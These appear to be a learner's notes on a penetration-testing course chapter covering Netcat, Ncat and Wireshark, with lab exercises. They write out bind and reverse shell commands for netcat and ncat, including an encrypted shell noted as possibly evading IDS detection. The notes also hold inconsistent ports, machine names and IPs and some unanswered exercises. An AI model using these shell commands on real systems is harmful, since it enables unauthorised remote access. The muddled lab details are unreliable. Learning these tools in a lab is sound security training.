# 2. - The Essential Tools

##### p.36

## Table fo contents

#### [2.1 - Netcat](#21---netcat-1)
#### [2.2 - Ncat]

## 2.1 - Netcat

[Netcat](https://en.wikipedia.org/wiki/Netcat) is a tool that can read and write to TCP and UDP ports.
The Hacker's Swiss Army Knife and exists as both Linux and Windows binaries.

### 2.1.1 - Connecting to a TCP/UDP Port

Connecting to a TCP/UDP port can be useful in several situations:

* To check if a port is open or closed
* To read a banner from the port
* To connect to a network service manually

Let's begin by using **netcat** to check if TCP port 110 (POP3 mail service) is open in [metasploitable](https://sourceforge.net/projects/metasploitable/) virtual machine.

```
root@kali:~# nc 192.168.0.104 110
(UNKNOWN) [10.0.0.22] 110 (pop3) open
+OK POP3 server lab ready <00003.1277944@lab>
```

The output aboce tells us several things. First, the TCP connection to IP 192.168.0.104 on port 110 succeeded, and **netcat** found the remote port open. Next, we can see that the server responded to our connection by "talking back to us" and spitting out the server welcome message, prompting us to log in, wich is standard for POP3 services.

### 2.1.2 Listening on a TCP/UDP Port

Listening on a TCP/UDP port using **netcat** is useful for network debugging client applications. Let's try implementing a simple chat involving two machines, using **netcat** both as a client and server.

Set up **netcat** to listen for **incomming connections** on TCP port 4444 on a Ubuntu machine (server):

```
root@ubuntu:~$ nc -vnlp 4444
Listening on [0.0.0.0] (family 0, port 5859)
```

Once we have bound port 4444 on the Windows machine Netcat, we can connect to that port from the Kali Linux machine to interact with it.

```
root@kali:~# nc -nv 10.0.2.2 4444
(UNKNOWN) [10.0.2.2] 5859 (?) open
This chat is from Kali Linux vm
```

Our text is sent to the Windows machine over TCP port 4444 and we can continue the *"chat"* from the Ubuntu machine (IP 10.0.2.2).

```
root@ubuntu:~$ nc -vnlp 5859
Listening on [0.0.0.0] (family 0, port 5859)
Connection from [127.0.0.1] port 5859 [tcp/*] accepted (family 2, sport 58668)
This chat is from Kali Linux machine
This chat is from Ubuntu machine
```

### Exercicies

1. Wich machine acted as the **netcat server**?

> Ubuntu

2. Wich machine acted as the **netcat client**?

> Kali Linux

3. On which machine was port 4444 actually opened?

> Ubuntu

4. The command line syntax difference between the client and serve.

* Server
```
root@ubuntu:~$ nc -vnlp 4444
```

* Client
```
root@kali:~# nc -nv 10.0.2.2 4444
```

### 2.1.3 Transferring Files with Netcat

Netcat can also be used to transfer files, both text and binary, from one computer to another. To send a file from the Kali Linux to the Ubuntu machine, we initiate a setup that is similar to the precious chat example.

On the **Ubuntu** machine, we will set up a **netcat** listener on port 4444 and redirect any incoming input into a file called *incoming.exe*

```
root@ubuntu:~$ nc -vnlp 4444 > incoming.exe
```

On the **Kali Linux** syste,, we will push the *wget.exe* file to the Ubuntu machine through TCP port 4444

```
root@kali:~# locate wget.exe
/usr/share/windows-binaries/wget.exe
root@kali:~# nc -vn 10.0.2.2 4444 < /usr/share/windows-binaries/wget.exe
```

The connection is received by **netcat** on the Ubuntu machine as shown bellow:

```
nc -vnlp 4444 > incoming.exe
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 46084)
```

Notice that we haven't received any feddback from **netcat** about our file upload progress. We can just wait for a moment and check wheter it has been fully upload to the Ubuntu machone (check file size).

### 2.1.4 Remote Administration with Netcat

One of the most useful features of netcat is its ability to do command redirection. Netcat can take an executable file and redirect the input, output, and error messages to a TCP/UDP port rather than the default console. To further explain this, consider the cmd.exe executable. By redirecting the stdin, stdout, and stderrto the network, you can bind cmd.exe to a local port. Anyone connecting to this port will be resented with a command prompt belonging to this computer.

#### 2.1.4.1 - Netcat Bind Shell Scenario
I our first scenario, Bob (running Windows) has requested Alice's assistence (running Linux) and has asked her to connect to his computer and issue some commands remotely. bob has a public IP address, and is directly connected to the Internet. Alice, however, is behind a NATd connection, and has an internal IP address. To complete the scenario, Bob needs to bind **cmd.exe** to a TCP port in his public IP address, and ask Alice to connect to this particular IP and port. Bob will procees to issue the following command with **netcat**

```
C:\Users\offsec> nc ­‐nlvp 4444 ­‐e cmd.exe
listening on [any] 4444...
```

Netcat has bound TCP port 4444 to **cmd.exe** and will redirect any input, output, or error messages from **cmd.exe** to the network. In other words, anyone connecting to TCP port 4444 on Bob's machine, hopeffully Alice, will be presented with Bob's command prompt.

```
root@kali:~# ifconfig eth0 | grep inet
		inet addr:10.0.0.4 cast:10.0.0.255 Mask:255.255.255.0

root@kali:~# nc -­nv 10.0.0.22 4444
(UNKNOWN) [10.0.0.22] 4444 (?) open
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users\offsec> ipconfig 
Windows IP Configuration
Ethernet adapter Local Area Connection:
Connection-specific DNS Suffix  .:
IPv4 Address. . . . . . . . . . .: 10.0.0.22
Subnet Mask . . . . . . . . . . .: 255.255.255.0
Default Gateway . . . . . . . . .: 10.0.0.138

C:\Users\offsec>
```

#### 2.1.4.2 - Reverse Shell Scenario

Reverse Shell Scenario In our second scenario, Alice needs help from Bob.
However, Alice has no control over the router in her office, and therefore cannot forward traffic from the router to her  internal machine. Is there any way for Bob to connect to Alice'ʹs computer, and solve her problem? Here we discover another useful feature of
Netcat, the ability to send a command shell to a listening host. In this situation, although Alice cannot bind a port to /bin/bash
locally on her computer and expect Bob to connect, she can send control of her command prompt to Bob'ʹs machine, instead.
This is known as a reverse shell.
To get this working, Bob needs to set up netcat to listen for an incoming shell.
We’ll use port 4444 in our example:

```
C:\Users\offsec> nc ­‐nlvp 4444 
listening on [any] 4444 ...
```

Now Alice can send a reverse shell from her Linux Machine to Bob:

```
root@kali:~# nc ­‐nv 10.0.0.22 4444 ­‐e /bin/bash
(UNKNOWN)    [10.0.0.22]    4444    (?)    open
```

### 2.1.5 Exercises

1. Implement a simple chat between you Kali and Windows system

> Ubuntu (Server)

```
nc -vnlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
```

> Kali Linux (Client)

```
nc -vn 10.0.2.2 4444
(UNKNOWN) [10.0.2.2] 4444 (?) open
```

2. Practice using Netcat to create the following:
* Reverse shell from Kali to Windows

* Reverse shell from Windows to Kali

* Bind shell on Kali. use your Windows client to connect to it

> Kali Linux
```
root@kali:~# nc -vnlp 4444 -e /bin/bash 
```

> Ubuntu (Windows)
```
$ nc -vn 10.0.2.15 4444
```

* Bind shell in Windows. Use your kali system to connec to it

> Ubuntu (Windows)
```
$ nc -vnlp 4444 -e /bin/bash
```

> Kali Linux
```
root@kali:~# nc -vn 10.0.2.2 4444
```

3. Transfer a file from your Windows to Kali system clinet to connect to it

> Kali Linux
```
root@kali:~# nc -vn 10.0.2.2 4444 < kali-linux-machine 
```

> Ubuntu (Windows)
```
zero@zero-ubt:~$ nc -vnlp 4444 > file.txt
```

## 2.2 - Ncat

Ncat is described as "a feature-packed networking utility that reads and writes data across networks from the command line".
On eog the major drawbacks of **Netcat**, from a penetration tester's standpoint, is that it lacks the ability to authenticate and excrypt incoming and outgoing connections.
For example, **ncat** could be used in the following way to replicate a more secure bind shell between Bob and Alice. Bob would use **ncat** to set up an SSL encrypted connection on port 4444 and allow only Alice's IP (10.0.0.4) to connect to it:

```
C:\Users\offsec> ncat -­­‐exec cmd.exe ‐-­allow 10.0.0.4 ­‐vnl 4444 -­‐ssl
Ncat: Version 5.59BETA1 ( http://nmap.org/ncat )
Ncat: Generating a temporary 1024­‐bit RSA key. 
Ncat: SHA­‐1 fingerprint: 1FC9 A338 0B1F 4AE5 897A 375F 404E 8CB1 12FA DB94
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.0.4:43500.
```

Alice, in turn, would connect to Bob's public IP with SSL encryption enabled, preventing eavesdropping, and possibly even IDS detection

```
root@kali:~# ncat -­‐v 10.0.0.22 4444 -­‐ssl
Ncat: Version 6.25 ( http://nmap.org/ncat )
Ncat: SSL connection to 10.0.0.22:4444.
Ncat: SHA­‐1 fingerprint: 1FC9 A338 0B1F 4AE5 897A 375F 404E 8CB1 12FA DB94
Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\offsec>
```

## Exercises

1. Use Ncat to create an encrypted reverse shell from your Windows system to your Kali machine.

> Ubuntu (Windows)
```
ncat --exec /bin/bash --allow 127.0.0.1 -vnl 4444 --ssl
Ncat: Version 7.01 ( https://nmap.org/ncat )
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 754B C09E EA5A 9624 BC01 CF3B 1B5E 73B6 8850 5EAA
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

> Kali Linux
```
ncat -v 10.0.2.2 4444 --ssl
Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Subject: CN=localhost
Ncat: Issuer: CN=localhost
Ncat: SHA-1 fingerprint: 754B C09E EA5A 9624 BC01 CF3B 1B5E 73B6 8850 5EAA
Ncat: Certificate verification failed (self signed certificate).
Ncat: SSL connection to 10.0.2.2:4444.
Ncat: SHA-1 fingerprint: 754B C09E EA5A 9624 BC01 CF3B 1B5E 73B6 8850 5EAA
```

2. Crate and encrypted bind shell on your Windows VM. Try to connect to it from kali without encryption. Does it still work?

```
```

3. Make an unencrypted Ncat bind shell on your Windows system. COnnect to the shell using Netcat. Does it work?

```
```

## 2.3 - Wireshark

As a secutiry professional, learning how to use a network packet sniffer is vital for day-to-day operations. Whether you are trying to inderstand a protocol, debug a network client, or analyze traffic, you'll always end up nedding a network sniffer.

### 2.3.1 - Wireshark Basics

Wireshark uses **Libpcap** (on Linux) or **Winpcap** (on Windows) libraries in order to capture packets from the network. The secret to using network sniffers such as **wireshark** is using capture and display filters to remove all information that you are not interested in.

### 2.3.2 - Making Sense of Network Dumps

Let's examine the following **pcap** dump of an attempt to browse to the **www.yahoo.com** website, and try to make sense of it.

| No. 	| Time 		  | Source 			 | Destination 	| Protocol | Info 									|
| --- 	| ---- 		  | ------ 			 | ----------- 	| -------- | ---- 									|
| 01	| 0.000000000 | Vmware_64:24:3e  | Broadcast 	| ARP 	   | Who has 10.0.0.138? Tell 10.0.0.18 	|
| 02	| 0.001182000 | Netgear_6b:9a:8a | Vmware_64:24	| ARP 	   | 10.0.0.138 is at e0:46:9a:6b:9a:8a 	|
| 03	| 0.001200000 | 10.0.0.18		 | 8.8.8.8		| DNS	   | Standard query 0x93f4 A www.yahoo.com 	|
| 04	| 0.001238000 | 10.0.0.18		 | 8.8.8.8		| DNS 	   | Standard query 0xbefa AAAA www.yahoo.com |
| 05	| 0.095027000 | 8.8.8.8			 | 10.0.0.18    | DNS	   | Standard query response 0x93f4 CNAME fd-fp3.wg1.b ... |
| 06	| 0.095421000 | 8.8.8.8			 | 10.0.0.18    | DNS	   | Standard query response 0xbefa CNAME fd-fp3.wg1.b ... |
| 07	| 0.095600800 | 10.0.0.18		 | 98.139.183.24| TCP      | 48209 > http [SYN] Seq=0 Win=14600 Len=0 MSS-1460 ... |
| 08	| 0.300527000 | 98.139.183.24    | 10.0.0.18	| TCP 	   | http > 48209 [SYN, ACK] Seq=0 Ack=1 Win=8192 Len-0 ... |
| 09 	| 0.300612000 | 10.0.0.18		 | 98.139.183.24| TCP      | 48209 > http [ACK] Seq=1 Ack=1 Win=14720 Len=0  ... |
| 10 	| 0.300796000 | 10.0.0.18		 | 98.139.183.24| HTTP     | GET / HTTP/1.1 |

* **Packet 01** : ARP broadcast looking fot the default gateway.
* **Packet 02** : ARP unicast reply providing the MAC address of the gateway
* **Packet 03** : DNS A (IP v4) forward lookup query for yahoo.com
* **Packet 04** : DNS AAAA (IP v6) forward lookup query
* **Packet 05** : DNS A response received.
* **Packet 06** : DNS AAAA response received
* **Packet 07-09** : 3-way handshake with port 80 on yahoo.com
* **Packet 10** : Initial protocol negotiation in HTTP.GET request sent

### 2.3.3 -  Capture and Display Filters

Capture dumps are rarely as clear, as there is usually a lot of background traffic on a network. **Capture filters** come to our aid, as they can filter out noninteresting traffic from the dump. These filters greatly help pinpoint the traffic you want, and reduce background noise to a point where you can once again make sense of what you see.

Once the traffic is captured, we can select the traffic we want Wireshark to display to us using display filters (top left).

### 2.3.4 - Following TCP Streams

At times, we might not have access to GUI network sniffers such as Wireshark. In these instances, we can use the command line **tcpdump** utility.
Tcpdump is one of the most common command0line packet analyzers and can be found on most Unix and Linux operating systems.